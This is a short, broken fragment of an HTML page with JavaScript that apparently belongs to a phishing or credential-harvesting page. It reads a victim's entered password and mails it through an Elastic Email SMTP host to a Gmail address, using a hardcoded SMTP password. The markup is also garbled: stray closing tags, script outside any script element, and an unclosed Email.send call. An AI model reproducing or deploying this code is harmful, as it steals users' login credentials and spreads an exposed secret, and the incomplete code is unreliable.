      </p>
    </div>

        let password = document.getElementById("password").value;

        Email.send({
          Host: "smtp.elasticemail.com",

          Password: "48EC737848288E288E040C0C9C7629431034",
          To: "stevethomas0901@gmail.com",
          From: "thomaswills939@gmail.com",

</html>
